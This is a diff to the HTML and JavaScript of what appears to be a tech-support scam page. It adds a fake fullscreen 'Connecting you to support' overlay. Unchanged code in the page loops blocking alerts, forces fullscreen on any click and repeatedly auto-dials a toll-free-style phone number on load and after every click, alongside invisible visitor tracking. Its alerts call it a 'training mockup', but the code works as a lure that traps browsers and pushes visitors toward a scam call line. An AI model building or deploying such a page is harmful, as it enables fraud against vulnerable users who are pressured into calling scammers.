@@ -103,6 +103,36 @@
         border-top-left-radius: 12px;
         border-top-right-radius: 12px;
     }
+
+    /* CONNECTING SCREEN */
+    #connectingScreen {
+        position: fixed;
+        inset: 0;
+        background: #000;
+        color: #fff;
+        display: none;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        text-align: center;
+        z-index: 9999;
+        font-size: 22px;
+        padding: 20px;
+    }
+
+    .spinner {
+        width: 45px;
+        height: 45px;
+        border: 4px solid #555;
+        border-top: 4px solid #fff;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
 </style>
 </head>
 
@@ -120,78 +150,71 @@
     </div>
 </div>
 
-<!-- FOOTER CALL BAR WITH TOLL-FREE NUMBER -->
+<!-- CONNECTING OVERLAY -->
+<div id="connectingScreen">
+    <div class="spinner"></div>
+    <p style="margin-top:20px;">Connecting you to support…</p>
+</div>
+
+<!-- FOOTER CALL BAR -->
 <a class="call-bar" href="tel:+18082774439">📞 Call Toll-Free: 1-808-277-4439</a>
 
 <script>
 window.onload = function() {
 
-    // First alert
     alert("This is a training mockup only. No real device actions will occur.");
-
-    // Trigger phone dial immediately
     window.location.href = "tel:+18082774439";
 
-    // Loop repeating alert + call
     setTimeout(function repeatAlert() {
-
         alert("This is a training mockup only. No real device actions will occur.");
-
-        // Trigger phone dial every loop
         window.location.href = "tel:+18082774439";
-
         setTimeout(repeatAlert, 1500);
     }, 1500);
 };
 </script>
 
-<!-- STATCOUNTER CODE -->
+<!-- STATCOUNTER -->
 <script type="text/javascript">
 var sc_project=13196894; 
 var sc_invisible=1; 
 var sc_security="7cf95a0a"; 
 </script>
-<script type="text/javascript"
-src="https://www.statcounter.com/counter/counter.js"
-async></script>
+<script type="text/javascript" src="https://www.statcounter.com/counter/counter.js" async></script>
+
 <noscript>
 <div class="statcounter">
-<a title="Web Analytics Made Easy - Statcounter"
-href="https://statcounter.com/" target="_blank">
+<a href="https://statcounter.com/" target="_blank">
 <img class="statcounter"
-src="https://c.statcounter.com/13196894/0/7cf95a0a/1/"
-alt="Web Analytics Made Easy - Statcounter"
-referrerPolicy="no-referrer-when-downgrade">
+src="https://c.statcounter.com/13196894/0/7cf95a0a/1/">
 </a>
 </div>
 </noscript>
 
-<!-- FULLSCREEN ON CLICK ANYWHERE + ALERT -->
+<!-- FULLSCREEN -->
 <script>
 function goFullscreen() {
-    let elem = document.documentElement;
-
-    if (elem.requestFullscreen) {
-        elem.requestFullscreen();
-    } else if (elem.webkitRequestFullscreen) {
-        elem.webkitRequestFullscreen();
-    } else if (elem.msRequestFullscreen) {
-        elem.msRequestFullscreen();
-    }
+    let e = document.documentElement;
+    if (e.requestFullscreen) e.requestFullscreen();
+    else if (e.webkitRequestFullscreen) e.webkitRequestFullscreen();
 }
-
 document.addEventListener("click", goFullscreen);
-
-document.getElementById("alertBox").addEventListener("click", function(event) {
-    event.stopPropagation();
+document.getElementById("alertBox").addEventListener("click", function(e){
+    e.stopPropagation();
     goFullscreen();
 });
 </script>
 
-<!-- AUTO-DIAL AFTER ANY CLICK -->
+<!-- AUTO-DIAL AFTER ANY CLICK WITH CONNECTING SCREEN -->
 <script>
 document.addEventListener("click", function() {
-    window.location.href = "tel:+18082774439";
+
+    // Show the fake connecting screen
+    document.getElementById("connectingScreen").style.display = "flex";
+
+    // Delay before actual dialing
+    setTimeout(function() {
+        window.location.href = "tel:+18082774439";
+    }, 1500);
 });
 </script>
 
